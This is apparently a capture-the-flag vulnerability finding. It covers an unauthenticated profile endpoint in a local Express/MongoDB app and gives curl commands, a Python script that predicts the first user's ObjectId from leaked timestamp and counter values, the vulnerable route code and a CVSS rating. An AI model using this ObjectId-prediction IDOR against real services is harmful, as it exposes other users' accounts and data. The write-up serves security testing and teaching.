- **Severity:** **CRITICAL**

**Prerequisites:**
None required for basic exploitation. For advanced ObjectId prediction attack:
- HTTP access to `http://localhost:3000`
- Basic command-line tools (curl)
- Python 3 (for ObjectId calculation in advanced method)

**Exploitation Steps:**

**Method 1: Direct Access via Known Credentials (Simplified)**

1. **Obtain first user's ObjectId through login redirect:**
   ```bash
   curl -s -X POST http://localhost:3000/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=user0&password=1b2e97s80wb7d08n-" 2>&1 \
     | grep -o 'profile/[a-f0-9]*'
   ```
   **Expected Output:** `profile/6902bf01e1d1472e60dbc497` (ObjectId will vary based on server start time)

2. **Exploit IDOR to access first user's profile without authentication:**
   ```bash
   curl -s http://localhost:3000/profile/6902bf01e1d1472e60dbc497
   ```
   **Expected Output:**
   ```html
   <h1>Welcome, user0</h1>
   <p>1st user to register here was at: 2025-10-30T01:27:29.000Z (Unix timestamp: 1761787649)</p>
   <p>FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}</p>
   ```

**Method 2: ObjectId Prediction Attack (Advanced - No Credentials Required)**

1. **Retrieve server start timestamp:**
   ```bash
   curl -s http://localhost:3000/starttime
   ```
   **Example Output:** `1761787649`

2. **Register a test account to obtain ObjectId structure information:**
   ```bash
   curl -s -X POST http://localhost:3000/register \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=testuser_123456&password=testpass123"
   ```
   **Example Output:**
   ```json
   {
     "userId":"6902bf1de1d1472e60dbc4a1",
     "userNumber":3,
     "message":"User created successfully. Total users: 3",
     "distance":10
   }
   ```

3. **Calculate first user's ObjectId using disclosed information:**
   ```python
   # Extract values from previous steps
   timestamp = 1761787649  # From step 1
   my_objectid = "6902bf1de1d1472e60dbc4a1"  # From step 2
   distance = 10  # From step 2

   # Calculate first user's ObjectId
   timestamp_hex = hex(timestamp)[2:].zfill(8)  # First 8 chars
   random_value = my_objectid[8:18]  # Middle 10 chars (same machine)
   my_counter = int(my_objectid[18:24], 16)  # Last 6 chars
   first_counter = my_counter - distance
   first_counter_hex = hex(first_counter)[2:].zfill(6)

   first_user_objectid = timestamp_hex + random_value + first_counter_hex
   print(first_user_objectid)
   # Output: 6902bf01e1d1472e60dbc497
   ```

4. **Access first user's profile using calculated ObjectId:**
   ```bash
   curl -s http://localhost:3000/profile/6902bf01e1d1472e60dbc497
   ```
   **Expected Output:**
   ```html
   <h1>Welcome, user0</h1>
   <p>1st user to register here was at: 2025-10-30T01:27:29.000Z (Unix timestamp: 1761787649)</p>
   <p>FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}</p>
   ```

**Proof of Impact:**

**1. CTF Flag Retrieved:**
```
FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}
```

**2. Complete Authorization Bypass Confirmed:**
- ✅ No HTTP 401 Unauthorized response (no authentication check exists)
- ✅ No HTTP 403 Forbidden response (no authorization check exists)
- ✅ No session cookie required (verified with fresh curl requests)
- ✅ Direct database query using user-controlled `req.params.id` parameter
- ✅ Any valid MongoDB ObjectId returns corresponding user's profile data

**3. Horizontal Privilege Escalation Demonstrated:**

Created test victim user and accessed their profile without authentication:
```bash
# Register victim user
curl -s -X POST http://localhost:3000/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=victim_user&password=victim_password"
# Response: {"userId":"6902bf32e1d1472e60dbc4b1", ...}

# Access victim's profile without authentication
curl -s http://localhost:3000/profile/6902bf32e1d1472e60dbc4b1
# Response: <h1>Welcome, victim_user</h1>
```

**4. Information Disclosure Chain:**

The vulnerability is compounded by multiple information disclosure endpoints:
- `/starttime` - Exposes exact server start timestamp (enables ObjectId prediction)
- `/info` - Exposes total user count and formatted timestamp
- `POST /register` response - Returns ObjectId and "distance" metric revealing counter increment

This information disclosure chain allows attackers to mathematically calculate the first user's ObjectId without requiring ANY credentials.

**Notes:**

**Root Cause Analysis:**
- The `GET /profile/:id` endpoint at line 202 has NO middleware protection
- Line 203 directly executes `User.findById(req.params.id)` with user-controlled input
- NO authentication check exists (no session validation)
- NO authorization check exists (no ownership verification)
- NO guard exists between route handler and database query

**Code Evidence:**
```javascript
// Lines 202-215 - Complete absence of authorization
app.get('/profile/:id', async (req, res) => {
    const user = await User.findById(req.params.id);  // ← No auth check!
    if (!user) {
        return res.status(404).send('User not found');
    }

    res.send(`
        <h1>Welcome, ${user.username}</h1>
        ${user._id.toString() == firstUserId ? '<p>' + flag + '</p>' : '-'}
    `);
});
```

**Security Implications:**
- Application has ZERO session management infrastructure
- NO authentication middleware exists anywhere in the codebase
- Login simply redirects to profile URL without creating any authentication artifact
- The URL itself becomes the only "authentication" mechanism

**Exploitation Complexity:** TRIVIAL
- Requires only basic HTTP requests
- No specialized tools needed (curl/browser sufficient)
- Exploitable by completely unauthenticated external attackers
- Two exploitation methods demonstrated (direct access and ObjectId prediction)

**CVSS 3.1 Score:** 7.5 HIGH
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality Impact: High (C:H)
- Integrity Impact: None (I:N)
- Availability Impact: None (A:N)
